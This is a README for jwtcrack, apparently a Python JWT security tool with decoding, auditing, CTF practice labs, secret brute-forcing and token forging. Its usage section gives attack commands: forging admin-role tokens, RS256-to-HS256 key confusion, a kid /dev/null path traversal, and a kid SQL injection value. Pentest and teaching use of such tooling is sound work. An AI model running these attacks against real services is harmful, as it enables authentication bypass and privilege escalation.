# jwtcrack

jwt token analyzer & secret brute-forcer.

inspects json web tokens, detects insecure configurations (alg:none, weak hmac algorithms, expired/missing claims), performs multi-threaded dictionary attacks against hs256/hs384/hs512 signatures to find weak secrets, and forges modified tokens for testing.

zero external dependencies beyond `rich` for terminal formatting. built using standard python crypto primitives.

## features

- **interactive web dashboard**: launch a local cyberpunk-styled dark mode gui in your browser (`jwtcrack gui`)
- **beginner educational mode**: visual token breakdown, plain-language explanations of claims & signatures, and built-in practice CTF labs (`jwtcrack learn`, `jwtcrack lab`)
- **decode**: parse and inspect token header, payload, and signature without needing the signing key
- **analyze & remediate**: audit token security posture and provide exact developer fix snippets (algorithms, claims, signatures)
- **crack**: multi-threaded wordlist attack against hs256, hs384, and hs512 tokens with live throughput stats
- **forge**: generate new tokens or alter existing claims (e.g. modify role or extend expiration) once the secret is known or with `alg:none`
- **asp.net core support**: audit and normalize Microsoft XML schema claims (`schemas.microsoft.com/ws/2008/06/identity/claims/role`), detect claim confusion vulnerabilities, and forge ASP.NET Core compatible tokens (`--aspnet`)
- **cve exploit engine**: forge tokens via RS256->HS256 Key Confusion (CVE-2015-9235), KID path traversal (`/dev/null` empty secret attack), KID SQL injection, and blank secret attacks
- **zero dependencies**: pure python stdlib implementation (`hmac`, `hashlib`, `base64`, `concurrent.futures`)

## installation

```bash
git clone https://github.com/emirplus/jwtcrack.git
cd jwtcrack
pip install -e .
```

or run directly:

```bash
python -m jwtcrack gui
```

## usage

### launch web dashboard (recommended)
```bash
jwtcrack gui
```
opens an interactive dark-mode dashboard at `http://127.0.0.1:8765` with built-in Beginner Practice Labs, token decoder, vulnerability auditor, secret cracker, and token forger.

### 1. beginner learn mode (token anatomy)
```bash
# visually break down token parts with plain-language explanation of claims
jwtcrack learn [token]
```

### 2. beginner practice labs (ctf)
```bash
# list all built-in challenges
jwtcrack lab

# start a specific challenge (e.g. lab 1)
jwtcrack lab 1
```

### 3. decode a token
```bash
jwtcrack decode <token>
```

### 4. analyze for vulnerabilities & view remediations
```bash
jwtcrack analyze <token>
```

### 5. brute-force weak secrets
```bash
jwtcrack crack <token> --wordlist wordlists/common.txt --threads 8
```

### 6. forge modified claims
```bash
jwtcrack forge <token> --secret "password123" --claims '{"role":"admin"}' --extend-exp 24h
```

### 7. generate a token from scratch
```bash
jwtcrack generate --secret "mysecret" --claims '{"sub":"user123","role":"admin"}'
```

### 8. asp.net core claim inspection & forging
```bash
# inspect and map asp.net xml schema claims
jwtcrack aspnet <token>

# forge an asp.net core token using standard json claims
jwtcrack forge <token> --secret "mysecret" --claims '{"role":"Administrator"}' --aspnet
```

### 9. exploit engine (cve & header bypasses)
```bash
# rs256 -> hs256 key confusion attack using public key
jwtcrack exploit <token> --attack key-confusion --public-key pubkey.pem --claims '{"role":"admin"}'

# kid /dev/null empty secret attack
jwtcrack exploit <token> --attack devnull --claims '{"role":"root"}'

# kid sql injection bypass
jwtcrack exploit <token> --attack sqli --kid "key' UNION SELECT 'mysecret' -- -" --secret "mysecret"

# blank secret attack
jwtcrack exploit <token> --attack blank --claims '{"role":"admin"}'
```

### 10. interactive mode
run without arguments to launch the interactive prompt:
```bash
jwtcrack
```

## example output

### crack successful
```text
╭────────────────────────────── CRACK SUCCESSFUL ──────────────────────────────╮
│ Found Secret: password123                                                    │
│                                                                              │
│ Tested: 250 passwords                                                        │
│ Elapsed: 0.008 seconds                                                       │
│ Speed: 31,250 attempts/sec                                                   │
╰──────────────────────────────────────────────────────────────────────────────╯
```

### analysis report
```text
                          Security Findings (2 issues)                          
┏━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Severity     ┃ Issue                   ┃ Description                         ┃
┡━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│  CRITICAL    │ Algorithm None Attack   │ Token uses 'none' algorithm —       │
│              │                         │ signature verification is disabled. │
├──────────────┼─────────────────────────┼─────────────────────────────────────┤
│     LOW      │ Missing Claims          │ Token is missing: exp, iss.         │
└──────────────┴─────────────────────────┴─────────────────────────────────────┘
```

## license

MIT
